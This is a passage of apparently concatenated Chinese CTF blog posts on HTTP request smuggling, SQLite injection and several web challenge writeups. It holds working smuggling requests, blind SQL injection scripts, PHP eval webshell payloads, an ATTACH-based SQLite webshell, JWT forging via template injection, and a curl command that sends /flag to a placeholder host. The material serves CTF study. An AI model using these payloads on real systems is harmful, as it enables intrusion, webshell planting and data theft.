前端服务器收到请求后，读取Content-Length判断这是一个完整请求，然后转发到后端服务器，后端服务器不处理Content-Length，但又由于Pipeline存在，这就意味着后端认为接收到了两个请求，导致了走私的发生。 cl-clRFC7230中规定，当服务器收到的请求中含有两个Content-Length且值不相等时应该返回400。但是总是有一些服务器会存在不严格执行标准的情况，在这样的情况下我们就可以安排走私了。 首先构造一个恶意请求： 1234567POST / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nContent-Length: 8\\r\\nContent-Length: 7\\r\\n12345\\r\\na 在这种情况下，前端读取到了cl是8，因此整个包被送入了后端，但是后端cl只读取了7，因此缓冲区此时剩下一个字母a。那么此时如果一个正常用户对服务器发起了请求： 12GET /index.html HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\n 原来存在于缓冲区的字母a就被拼接了，实际请求发生了改变： 12aGET /index.html HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\n 这样就可以插入一些恶意语句，拓展为CSRF等等。 cl-te简单来说，这种走私方式利用了前端服务器只处理Content-Length，后端只处理Transfer-Encoding这一情况，而关于Transfer-Encoding这一请求头可以参考下面这篇文章：HTTP 协议中的 Transfer-Encoding 这其中我们要只要的是chunked编码的格式（size用hex表示）： 1[chunk size][\\r\\n][chunk data][\\r\\n][chunk size][\\r\\n][chunk data][\\r\\n][chunk size = 0][\\r\\n][\\r\\n] 接下来我们可以构造如下请求： 12345678910111213POST / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\nAccept-Language: en-US,en;q=0.5\\r\\nCookie: session=E9m1pnYfbvtMyEnTYSe5eijPDC04EVm3\\r\\nConnection: keep-alive\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nG 这样，由于前端服务器解析了Content-Length，因此 1230\\r\\n\\r\\nG 被全部解析，接下来传输到后端后后端服务器解析Transfer-Encoding，那么识别到G之前就被认为已经结束了，因此G被留在了缓冲区，那么就会导致下一次请求G被解析出来拼接到请求之前，导致报错。 te-cl看名字应该也能理解，就是和cl-te相反，前端服务器解析Transfer-Encoding，而后端服务器解析Content-Length。那么我们构建这样一个请求： 1234567891011121314POST / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\nAccept-Language: en-US,en;q=0.5\\r\\nCookie: session=3Eyiu83ZSygjzgAfyGPn8VdGbKw5ifew\\r\\nContent-Length: 4\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n21\\r\\nPOST /mrl64.html HTTP/1.1\\r\\n\\r\\n0\\r\\n\\r\\n 我们发现首先前端服务器处理Transfer-Encoding，那么直到读取到0\\r\\n\\r\\n结束，因此整个请求都是完整的，这样整个请求就被送到了后方服务器。接下来后端服务器解析Content-Length，那么读取完21\\r\\n后就结束了，后面的内容就被当做了另一个请求继续执行。 te-te那么排列组合一下剩下的最后一种情况就是te-te了，前后端服务器都会解析处理Transfer-Encoding。不过有所区别的是，由于前后端服务器毕竟不是同一种，我们无法直接构造请求。这里我们可以使用Content-Length加以混淆从而使服务器不处理某个Transfer-Encoding。这样就相当于把问题又变成了te-cl或者cl-te。 那么我们构造请求： 123456789101112131415161718POST / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\nAccept-Language: en-US,en;q=0.5\\r\\nCookie: session=Mew4QW7BRxkhk0p1Thny2GiXiZwZdMd8\\r\\nContent-length: 4\\r\\nTransfer-Encoding: chunked\\r\\nTransfer-Encoding: cow\\r\\n\\r\\n5c\\r\\nGPOST / HTTP/1.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 15\\r\\n\\r\\nx=1\\r\\n0\\r\\n\\r\\n 这里后端服务器就不会解析Transfer-Encoding了，而是解析处理Content-length，达到了te-cl的走私效果。 [RoarCTF 2019]Easy Calc这道题我们之前是利用php字符串解析漏洞解决的，那么现在我们利用http走私的方法。 首先放下代码calc.php： 123456789101112131415 &lt;?phperror_reporting(0);if(!isset($_GET[&#x27;num&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; $str = $_GET[&#x27;num&#x27;]; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;,&#x27;\\$&#x27;,&#x27;\\\\&#x27;,&#x27;\\^&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123; die(&quot;what are you want to do?&quot;); &#125; &#125; eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);&#125;?&gt; 其实字母都是不允许输入的，会返回403，不过我们可以利用cl-cl的http请求走私来绕过waf。 构造如下请求： 123456789101112GET /calc.php?num=phpinfo(); HTTP/1.1Host: node4.buuoj.cn:25903User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: track_uuid=9500a345-a839-4645-aee4-f9c598b48bf2; __gads=ID=f01d1993f76853c0-224634b7f6d100ca:T=1649937963:RT=1649937963:S=ALNI_MZ-hofC8jAB4S9yUeyX8RMp1LN2-gUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Length: 0Content-Length: 0 由于前后端服务器分别解析了Content-Length，导致服务器以为我们没有输入内容，返回了400，但是phpinfo依然成功显示。因此这样我们只需要绕过明面的blacklist就可以了，最终payload： 123456789101112GET /calc.php?num=var_dump(readfile(chr(47).base_convert(25254448,10,36))); HTTP/1.1Host: node4.buuoj.cn:25903User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: track_uuid=9500a345-a839-4645-aee4-f9c598b48bf2; __gads=ID=f01d1993f76853c0-224634b7f6d100ca:T=1649937963:RT=1649937963:S=ALNI_MZ-hofC8jAB4S9yUeyX8RMp1LN2-gUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Length: 0Content-Length: 0 构造这个请求获得flag。 总结比赛里的那题http请求走私难度还是挺大的，等之后可以复现一下，也了解一下http走私在比赛中的利用方法，理论写起来还是比较空泛的，最后一定要落到实践上。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-http -web","slug":"http-web","permalink":"http://example.com/tags/http-web/"}]},{"title":"sqlite数据库及注入","slug":"sqlite数据库及注入","date":"2022-04-28T08:14:59.000Z","updated":"2022-04-28T11:45:14.563Z","comments":true,"path":"2022/04/28/sqlite数据库及注入/","link":"","permalink":"http://example.com/2022/04/28/sqlite%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8F%8A%E6%B3%A8%E5%85%A5/","excerpt":"前言 最近实在是忙都没时间写博客，难得周四院休赶紧把之前挖的sqlite的坑给填了。","text":"前言 最近实在是忙都没时间写博客，难得周四院休赶紧把之前挖的sqlite的坑给填了。 sqlite与mysql的不同 Sqlite数据库的特点是它每一个数据库都是一个文件，当你查询表的完整信息时会得到创建表的语句。所以mysql盲注还是比较花时间的，因为会查出完整语句。 sqlite数据库有一张sqlite_master表，里面有type/name/tbl_name/rootpage/sql记录着用户创建表时的相关信息，查询的利用核心便是这个表了。 sqlite数据库的注释符是--，而并非是mysql的#或者--+，sqlite中的空格会自动用加号表示。 sqlite的增删查改新建表： 1create table test01(id int,name varchar(255)); 插入数据： 1insert into test01 (id,name) values (1,&#x27;mrl64&#x27;); 插入字段： 1alter table test01 add column passwd varchar(255); 查询数据： 12select name from test01 where id=1;//mrl64 更改数据： 1Update teat01 set name=’strl’ where id=1; 删库跑路（bushi： 1drop table test01; 要注意，sqlite不能直接更改字段类型，如果要更改只能重新创建表格并进行数据迁移。 sqlite注入sqlite和mysql虽然存在的一些细微差别，不过在注入方法上还是大体相近的。 联合注入由于sqlite的性质决定了我们不需要查库想，联合查询同样也是order by 配合union select一套组合拳下来，下面就放一下大概的流程吧： 123456789?id=1 order by 3 //order by确定字段数?id=0 union select 1,2,group_concat(name) from sqlite_master //查表?id=0 union select 1,2,group_concat(sql) from sqlite_master //查字段?id=0 union select 1,2,group_concat(flag) from flag //查数据当然也推荐使用limit进行逐条打印 布尔盲注这里和mysql最大的差别在于sqlite没有ascii()函数，因此只能使用字典爆破的方式进行盲注，不过sqlite是区分大小写的，因此可以避免mysql盲注时不确定大小写的尴尬。 没有很强的waf的话直接用sqlmap也是可以跑的，这里贴一个之前做题的脚本： 123456789101112131415161718192021222324252627import requestsimport stringstrs = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@_.,-&#123;&#125; &quot;url = &quot;http://1.14.71.254:28467/query&quot;s = requests.session()headers = &#123;&#x27;Cookie&#x27;: &#x27;session=eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.YklOVg.Pz554uNEiaxxBCpP4pm7-G8iucg&#x27;&#125;if __name__ == &quot;__main__&quot;: name = &#x27;&#x27; for i in range(0,100): char = &#x27;&#x27; for j in strs: #表+字段 #payload = &quot;1 and substr((select sql from sqlite_master limit 1,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(i, j) #数据 payload = &quot;1 and substr((select flag from flag limit 0,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(i, j) data = &#123;&quot;id&quot;: payload&#125; r = s.post(url=url, data=data, headers=headers) #print(r.text) if &quot;exist&quot; in r.text: name += j print(j, end=&#x27;&#x27;) char = j break if char == &#x27;%&#x27;: break 时间盲注sqlite没有sleep()函数，我们就用下位替代randomblob()函数来代替，这个函数可以生成一个N字节的blob，我们可以通过这个函数来达到延迟的效果。 randomblob(): The randomblob(N) function return an N-byte blob containing pseudo-random bytes. If N is less than 1 then a 1-byte random blob is returned. Hint: applications can generate globally unique identifiers using this function together with hex() and/or lower() like this:hex(randomblob(16)) 我们的查询语句构造方法： 1and 1=(case when(substr(sqlite_version(),1,1)=&#x27;3&#x27;) then randomblob(1000000000) else 0 end) case when()的用法就相当于三目运算符那样，注入的时候适当更改payload就可以了。 构造webshell用sqlite构建webshell这个姿势还是比较有意思的，用到了sqlite的附加数据库——ATTACH语句来进行构造。 ATTACH: 12345ATTACH DATABASE file_name AS database_name;如果数据库尚未被创建，上面的命令将创建一个数据库，如果数据库已存在，则把数据库文件名称与逻辑数据库&#x27;Alias-Name&#x27;绑定在一起。打开的数据库和使用ATTACH附加进来的数据库的必须位于同一文件夹下。 我们通过去建立一个文件，再插入payload的方式构建webshell。 构造过程： 123ATTACH DATABASE &#x27;/home/shell.php&#x27; AS shell; //创建文件create TABLE shell.exp (payload text); //创建表格，为插入语句做准备insert INTO shell.exp (payload) VALUES (&#x27;&lt;?php @eval($_POST[1]); ?&gt;&#x27;); //插入数据 总结sqlite还是很有意思的一块内容，除了SQLite voting那题以外暂时还没有看到难度较高的sqlite题，这块的知识感觉在之后也是一个趋势吧。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -sqlite","slug":"web-sqlite","permalink":"http://example.com/tags/web-sqlite/"}]},{"title":"攻防世界3","slug":"攻防世界3","date":"2022-04-19T12:59:13.000Z","updated":"2022-04-21T14:20:19.148Z","comments":true,"path":"2022/04/19/攻防世界3/","link":"","permalink":"http://example.com/2022/04/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C3/","excerpt":"前言 继续滚回来刷攻防世界了。","text":"前言 继续滚回来刷攻防世界了。 Cat这题考的点完美踩在我的遗忘点上，赶紧记一波。首先进入网页是一个比较熟悉的ping功能，猜测rce，但是发现有waf，对rce命令进行fuzz发现完全无法执行，因此考点不是rce。 文件穿梭也不对，ssrf也不对，因此这题上来就卡住了。求助万能的wp，首先我们在url参数中传入%80或者以后的ascii字符，可以得到Django报错页面的html码，结合报错原因应该是因为ascii编码不支持导致的。 这里就要想到在php中可以利用@进行任意文件读取，比如读取index.php: 1?url=@index.php 既然存在任意文件读取那就简单了，我们可以考虑猜测flag位置或者查看配置文件，这种题根目录和网页根目录没有flag的话多半得去配置文件找，那么这题要找python的配置文件： 1?url=@/opt/api/api/settings.py 获取数据库名database.sqlite3，读取数据库内容即可找到flag： 1?url=@/opt/api/database.sqlite3 FlatScience也是相当有难度的一题，首先进去好像只有几个pdf文件能下载，干不了啥别的事，那么常规信息搜集一下，发现robots.txt，隐藏了login.php和admin.php，依次查看。 admin.php中源码直接写道不可能bypass，fuzz了下发现确实bypass不了，那么把目光放在login.php上。查看源码发现让我们GET一个debug参数进去，传入后发现后端源码： 1234567891011121314151617181920212223242526&lt;?phpif(isset($_POST[&#x27;usr&#x27;]) &amp;&amp; isset($_POST[&#x27;pw&#x27;]))&#123; $user = $_POST[&#x27;usr&#x27;]; $pass = $_POST[&#x27;pw&#x27;]; $db = new SQLite3(&#x27;../fancy.db&#x27;); $res = $db-&gt;query(&quot;SELECT id,name from Users where name=&#x27;&quot;.$user.&quot;&#x27; and password=&#x27;&quot;.sha1($pass.&quot;Salz!&quot;).&quot;&#x27;&quot;); if($res)&#123; $row = $res-&gt;fetchArray(); &#125; else&#123; echo &quot;&lt;br&gt;Some Error occourred!&quot;; &#125; if(isset($row[&#x27;id&#x27;]))&#123; setcookie(&#x27;name&#x27;,&#x27; &#x27;.$row[&#x27;name&#x27;], time() + 60, &#x27;/&#x27;); header(&quot;Location: /&quot;); die(); &#125;&#125;if(isset($_GET[&#x27;debug&#x27;]))highlight_file(&#x27;login.php&#x27;);?&gt; 锁定注入点为usr参数，数据库类型为sqlite，试了下没加waf，那直接sqlmap一把嗦： 1python2 sqlmap.py -r 1.txt --risk 3 --level 5 --dump-all --batch 再挖个坑，之后写篇关于sqlite的博客吧，结果： 我们发现了admin的密码，但是这时加密过的，源码也告诉我们加密逻辑是sha1($password.&quot;Salz!&quot;)，而根据hint的内容，估计密码就存在论文中，那我们就把论文中的每一个词都试一遍，简单来说就是爆破（，这个exp真的不会写，扒一个吧： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145import requestsfrom bs4 import BeautifulSoupimport osimport reimport hashlibfrom pdfminer.pdfparser import PDFParserfrom pdfminer.pdfdocument import PDFDocumentfrom pdfminer.pdfpage import PDFPagefrom pdfminer.pdfpage import PDFTextExtractionNotAllowedfrom pdfminer.pdfinterp import PDFResourceManagerfrom pdfminer.pdfinterp import PDFPageInterpreterfrom pdfminer.layout import *from pdfminer.converter import PDFPageAggregator# 将pdf转换为txt的函数def pdf2txt(path): # 打开PDF文件 pdfFile = open(path, &#x27;rb&#x27;) # 创建pdf文档分析器 parser = PDFParser(pdfFile) # 创建PDF文档对象存储文档结构 document = PDFDocument(parser) # 检查文件是否允许文本提取 if not document.is_extractable: raise PDFTextExtractionNotAllowed # 创建PDF资源管理器对象来存储共享资源 resource = PDFResourceManager() # 设定参数进行分析 laparams = LAParams() # 创建一个PDF设备对象 device = PDFPageAggregator(resource, laparams=laparams) # 创建一个PDF解释器对象 interpreter = PDFPageInterpreter(resource,device) # 创建存储转换结果的同名txt文件 fileName = str(path.split(&quot;.&quot;)[0]) newFileName = fileName + &quot;.txt&quot; f = open(newFileName, &quot;w&quot;) # 处理每一页 for page in PDFPage.create_pages(document): interpreter.process_page(page) # 接受该页面的LTPage对象 layout = device.get_result() for x in layout: if (isinstance(x, LTTextBoxHorizontal)): # 写入txt文件 try: f.writelines(x.get_text() + &quot;\\n&quot;) except: pass f.close()# 下载所有pdf文件的函数def downloadpdf(): pdfUrl = [] # 存放所有pdf文件的连接 # 爬取所有的pdf文件的连接 urlList = [ &quot;http://111.200.241.244:49530/&quot;, &quot;http://111.200.241.244:49530/1/index.html&quot;, &quot;http://111.200.241.244:49530/1/2/index.html&quot;, &quot;http://111.200.241.244:49530/1/2/4/index.html&quot;, &quot;http://111.200.241.244:49530/1/2/5/index.html&quot;, &quot;http://111.200.241.244:49530/1/3/index.html&quot;, &quot;http://111.200.241.244:49530/1/3/6/index.html&quot;, &quot;http://111.200.241.244:49530/1/3/7/index.html&quot;, &quot;http://111.200.241.244:49530/1/3/7/8/index.html&quot; ] for each in urlList: r = requests.get(url=each) soup = BeautifulSoup(r.text, &#x27;lxml&#x27;) result = soup.find_all(name=&quot;a&quot;, attrs=&#123;&quot;title&quot;:&quot;my very fav paper&quot;&#125;) for tmp in result: if tmp[&quot;href&quot;].endswith(&quot;.pdf&quot;): pdfUrl.append(each.split(&quot;index.html&quot;)[0] + tmp[&quot;href&quot;]) # 使用curl -O 命令下载pdf文件 for each in pdfUrl: os.system(&quot;curl -O &quot; + each)# 取hash值的函数def sha1(msg): sha1 = hashlib.sha1() sha1.update((msg + &quot;Salz!&quot;).encode(&quot;utf-8&quot;)) return sha1.hexdigest()# 破解密码的函数def getpassword(): passlist = &#123; &quot;3fab54a50e770d830c0416df817567662a9dc85c&quot;:&quot;admin&quot;, &quot;54eae8935c90f467427f05e4ece82cf569f89507&quot;:&quot;fritze&quot;, &quot;34b0bb7c304949f9ff2fc101eef0f048be10d3bd&quot;:&quot;hansi&quot; &#125; for each in os.listdir(os.curdir): # 取出txt文件 if each.endswith(&quot;.txt&quot;): with open(each, &quot;r&quot;) as file: a = file.read() b = re.split(r&quot;[\\s\\,\\;\\.]+&quot;, a) # 将单词分割出来 c = [] tmp = &quot;&quot; judge = False # 处理以-结尾的行，最终的结果保存在c中 for each in b: if each.endswith(&quot;-&quot;): tmp = each.split(&quot;-&quot;)[0] judge = True elif judge: c.append(tmp + each) judge = False else: c.append(each) # 遍历c碰撞得到密码 for each in c: print(each) if sha1(each) in passlist: return &quot;----&quot; + passlist[sha1(each)] + &quot;&#x27;s password is &quot; + each + &quot;Salz!&quot; + &quot;----&quot;def main(): os.chdir(os.curdir + os.sep + &quot;pdfdir&quot;) # 修改工作目录 downloadpdf() # 下载pdf文件 # 将所有pdf文件转换成txt文件 for each in os.listdir(os.curdir): pdf2txt(each) # 遍历所有的txt文件得到密码 password = getpassword() return passwordif __name__ == &quot;__main__&quot;: print(main()) 跑出来密码为ThinJerboa，登录获得flag。 ics-07小做一手工控，这次的考点在项目管理一栏中。进入网页审查元素发现存在view-source.php，访问一波，审计代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?php session_start(); if (!isset($_GET[page])) &#123; show_source(__FILE__); die(); &#125; if (isset($_GET[page]) &amp;&amp; $_GET[page] != &#x27;index.php&#x27;) &#123; include(&#x27;flag.php&#x27;); &#125;else &#123; header(&#x27;Location: ?page=flag.php&#x27;); &#125; ?&gt; &lt;?php if ($_SESSION[&#x27;admin&#x27;]) &#123; $con = $_POST[&#x27;con&#x27;]; $file = $_POST[&#x27;file&#x27;]; $filename = &quot;backup/&quot;.$file; if(preg_match(&#x27;/.+\\.ph(p[3457]?|t|tml)$/i&#x27;, $filename))&#123; die(&quot;Bad file extension&quot;); &#125;else&#123; chdir(&#x27;uploaded&#x27;); $f = fopen($filename, &#x27;w&#x27;); fwrite($f, $con); fclose($f); &#125; &#125; ?&gt; &lt;?php if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== &#x27;1&#x27; &amp;&amp; substr($_GET[id], -1) === &#x27;9&#x27;) &#123; include &#x27;config.php&#x27;; $id = mysql_real_escape_string($_GET[id]); $sql=&quot;select * from cetc007.user where id=&#x27;$id&#x27;&quot;; $result = mysql_query($sql); $result = mysql_fetch_object($result); &#125; else &#123; $result = False; die(); &#125; if(!$result)die(&quot;&lt;br &gt;something wae wrong ! &lt;br&gt;&quot;); if($result)&#123; echo &quot;id: &quot;.$result-&gt;id.&quot;&lt;/br&gt;&quot;; echo &quot;name:&quot;.$result-&gt;user.&quot;&lt;/br&gt;&quot;; $_SESSION[&#x27;admin&#x27;] = True; &#125; ?&gt; 三段代码，第一段代码的意思是如果page的值不为空且page不为index.php，就会包含flag.php，否则就会直接重定向page为flag.php。 第二段代码是文件写入，但是存在waf，并且要求$_SESSION[‘admin’]为true，则段代码应该是最后来看的。 第三段代码总的来说就是要GET一个id参数，这个参数的浮点数不能为1，且id的最后一位必须得是9，这样才能进行sql查询。特别要注意，在浮点数那里的比较中用的是强类型比较，因此不能用数字绕。 我们针对第三段代码先构建payload： 1?page=flag.php&amp;id=1a9 可以看到页面上出现了name:admin，因此我们的session被置为了true，接下来就是写文件的部分了。 这里的waf主要是禁用了文件后缀，后缀不能为php``php3/4/5/7``pht``phtml，如果没有检测到，则把文件写入并保存在/uploaded/backup/filename中。 那么这里要用到一个很经典的apache文件解析漏洞，apache解析文件时从最右边开始解析，如果不是一个有效的后缀则会向左继续匹配，如果我们上传一个shell.php.xxx文件的话，apache就会把它解析成shell.php文件。 但是尝试getshell发现失败了，猜测是我们在这个文件夹中没有操作权限，因此我们把php文件写入父目录中： 1con=&lt;?php @eval($_POST[&#x27;mrl64&#x27;]);?&gt;&amp;file=../shell.php/. 因此文件写在了/uploaded中，访问即可getshell，flag在网页目录下。 bug进入网页告诉我们要登录，然后跳转到登录页面，可以注册和找回密码，fuzz发现不存在sql注入，那么注册登录进行查看。 登陆成功后发现熟悉的笑脸：），点击可选菜单发现Manage需要是admin才能使用。猜测在忘记密码部分存在逻辑漏洞，因此尝试改密，用自己的信息绕过密保，接着在step1输入新密码，抓包获取step2更改username，改密成功，登录admin。 接下来发现ip限制，XFF即可，进入后审查元素发现提示： 1index.php?module=filemanage&amp;do=??? 猜测do的内容为upload，访问后出现文件上传，简单的upload绕过，用.php5绕过后缀检测，js标签绕过php标签检测，上传成功即可获取flag。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"【LineCTF2022】部分题目复现","slug":"【LineCTF2022】部分题目复现","date":"2022-04-17T08:08:13.000Z","updated":"2022-04-19T03:24:51.250Z","comments":true,"path":"2022/04/17/【LineCTF2022】部分题目复现/","link":"","permalink":"http://example.com/2022/04/17/%E3%80%90LineCTF2022%E3%80%91%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/","excerpt":"前言 齐安信的比赛，当时都没发现有这比赛，现在有环境了来尝试复现下。","text":"前言 齐安信的比赛，当时都没发现有这比赛，现在有环境了来尝试复现下。 BB审计源码： 123456789101112131415161718192021222324 &lt;?php error_reporting(0); function bye($s, $ptn)&#123; if(preg_match($ptn, $s))&#123; return false; &#125; return true; &#125; foreach($_GET[&quot;env&quot;] as $k=&gt;$v)&#123; if(bye($k, &quot;/=/i&quot;) &amp;&amp; bye($v, &quot;/[a-zA-Z]/i&quot;)) &#123; putenv(&quot;&#123;$k&#125;=&#123;$v&#125;&quot;); &#125; &#125; system(&quot;bash -c &#x27;imdude&#x27;&quot;); foreach($_GET[&quot;env&quot;] as $k=&gt;$v)&#123; if(bye($k, &quot;/=/i&quot;)) &#123; putenv(&quot;&#123;$k&#125;&quot;); &#125; &#125; highlight_file(__FILE__);?&gt; 复杂的代码审计往往只需要几行朴实无华的代码，比如这段代码。我们发现我们能传入的只有env参数，并且这个参数还不能有字母。这个地方尝试用八进制绕过(whoami)： 接着看这段代码，也十分眼熟啊，直接想到p牛不久前写的文章：我是如何利用环境变量注入执行任意命令 文章详细剖析了原理，这里我们先直接运用BASH_ENV导致的命令注入，示例： 成功打印了imdude，说明注入点存在，既然如此，我们就可以利用curl反弹shell，exp： 123456789101112131415import stringimport requestscmd = &#x27;cat /flag | curl -d @- xx.xx.xx.xx:2333&#x27;o = &#x27;&#x27;for c in cmd: if c in string.ascii_letters: o += f&quot;$&#x27;\\\\&#123;oct(ord(c))[2:]&#125;&#x27;&quot; #转八进制 else: o += cr = requests.get(f&#x27;http://caa49c7e-c032-4246-9864-b4df0d75fbbc.node4.buuoj.cn:81/?env[BASH_ENV]=`&#123;o&#125;`&#x27;)print(r.text) 监听2333端口，运行exp获取flag。 gotm进入环境一看什么都没有，太爱了，不过给了附件，看了一下是用go语言写的，关键部分代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495func auth_handler(w http.ResponseWriter, r *http.Request) &#123; uid := r.FormValue(&quot;id&quot;) upw := r.FormValue(&quot;pw&quot;) if uid == &quot;&quot; || upw == &quot;&quot; &#123; return &#125; if len(acc) &gt; 1024 &#123; clear_account() &#125; user_acc := get_account(uid) if user_acc.id != &quot;&quot; &amp;&amp; user_acc.pw == upw &#123; token, err := jwt_encode(user_acc.id, user_acc.is_admin) if err != nil &#123; return &#125; p := TokenResp&#123;true, token&#125; res, err := json.Marshal(p) if err != nil &#123; &#125; w.Write(res) return &#125; w.WriteHeader(http.StatusForbidden) return&#125;func regist_handler(w http.ResponseWriter, r *http.Request) &#123; uid := r.FormValue(&quot;id&quot;) upw := r.FormValue(&quot;pw&quot;) if uid == &quot;&quot; || upw == &quot;&quot; &#123; return &#125; if get_account(uid).id != &quot;&quot; &#123; w.WriteHeader(http.StatusForbidden) return &#125; if len(acc) &gt; 4 &#123; clear_account() &#125; new_acc := Account&#123;uid, upw, false, secret_key&#125; acc = append(acc, new_acc) p := Resp&#123;true, &quot;&quot;&#125; res, err := json.Marshal(p) if err != nil &#123; &#125; w.Write(res) return&#125;func flag_handler(w http.ResponseWriter, r *http.Request) &#123; token := r.Header.Get(&quot;X-Token&quot;) if token != &quot;&quot; &#123; id, is_admin := jwt_decode(token) if is_admin == true &#123; p := Resp&#123;true, &quot;Hi &quot; + id + &quot;, flag is &quot; + flag&#125; res, err := json.Marshal(p) if err != nil &#123; &#125; w.Write(res) return &#125; else &#123; w.WriteHeader(http.StatusForbidden) return &#125; &#125;&#125;func root_handler(w http.ResponseWriter, r *http.Request) &#123; token := r.Header.Get(&quot;X-Token&quot;) if token != &quot;&quot; &#123; id, _ := jwt_decode(token) acc := get_account(id) tpl, err := template.New(&quot;&quot;).Parse(&quot;Logged in as &quot; + acc.id) if err != nil &#123; &#125; tpl.Execute(w, &amp;acc) &#125; else &#123; return &#125;&#125;func main() &#123; admin := Account&#123;admin_id, admin_pw, true, secret_key&#125; acc = append(acc, admin) http.HandleFunc(&quot;/&quot;, root_handler) http.HandleFunc(&quot;/auth&quot;, auth_handler) http.HandleFunc(&quot;/flag&quot;, flag_handler) http.HandleFunc(&quot;/regist&quot;, regist_handler) log.Fatal(http.ListenAndServe(&quot;0.0.0.0:11000&quot;, nil))&#125; 我们总共有四个路由，上面的函数分别对应了四个路由的功能，我们最后要在/flag中获取flag，必须满足is_admin == true，那么就要求我们必须传入一个正确的X-Token。 而在/路由的函数中我们发现go语言的ssti，如果我们能令acc，即id的值为&#123;&#123;.&#125;&#125;，就可以得到secert_key的值，这样就可以伪造jwt了。 首先我们根据/regist路由的内容注册账号： 1/regist?id=&#123;&#123;.&#125;&#125;&amp;pw=123 接着根据/auth路由内容登录获取一个token，这个token的is_admin部分是false，我们无法直接使用，但是根据前面的ssti，我们可以访问/路由获取secret_key： 12345/auth?id=&#123;&#123;.&#125;&#125;&amp;pw=123return:&#123;&quot;status&quot;:true,&quot;token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOmZhbHNlfQ.0Lz_3fTyhGxWGwZnw3hM_5TzDfrk0oULzLWF4rRfMss&quot;&#125;带上token访问/return：Logged in as &#123;&#123;&#123;.&#125;&#125; 123 false this_is_f4Ke_key&#125; 获取到secret_key的值为this_is_f4Ke_key，看起来还很有迷惑性，接下来伪造jwt： 带上伪造的token访问/flag路由，获取flag。 Memo Driver进入页面看起来像是个留言板之类的东西，可以写东西然后保存，再进入/view路由查看，功能大概这么多。 然后下载附件查看源码，好家伙python写的，这三题用了三个语言写网页，太绝了。源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137import osimport hashlibimport shutilimport datetimeimport uvicornimport loggingfrom urllib.parse import unquotefrom starlette.applications import Starlettefrom starlette.responses import HTMLResponsefrom starlette.routing import Route, Mountfrom starlette.templating import Jinja2Templatesfrom starlette.staticfiles import StaticFileslogger = logging.getLogger()logger.setLevel(logging.DEBUG)templates = Jinja2Templates(directory=&#x27;./&#x27;)templates.env.autoescape = Falsedef index(request): context = 